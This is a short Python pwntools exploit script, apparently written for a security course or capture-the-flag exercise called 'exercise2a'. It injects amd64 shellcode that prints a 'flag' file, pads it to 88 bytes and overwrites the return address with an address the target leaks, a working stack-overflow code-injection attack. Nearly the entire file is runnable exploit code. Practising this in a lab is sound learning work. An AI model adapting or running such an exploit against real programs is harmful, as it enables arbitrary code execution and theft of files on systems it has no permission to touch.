#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
from pwnlib.shellcraft.amd64.linux import cat
from pwnlib.asm import asm
import binascii
import sys

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise2a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
	if args.GDB:
		return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
	else:
		return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

# Might need to find a way to remove hardcoded 88
def pad_assembly(assembly_code):
	padding_len = 88 - len(assembly_code)
	return assembly_code + b'\x00' * padding_len

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
assembly_code = asm(cat("flag"))
r = start()
code_addr = r.recvline()

# Correct address where the injected code is located at
code_addr = binascii.unhexlify(code_addr[2:-1])[::-1]
padded_assembly = pad_assembly(assembly_code)
r.recvline()

r.sendline(padded_assembly + code_addr)
ret = r.recvall()
print(ret)
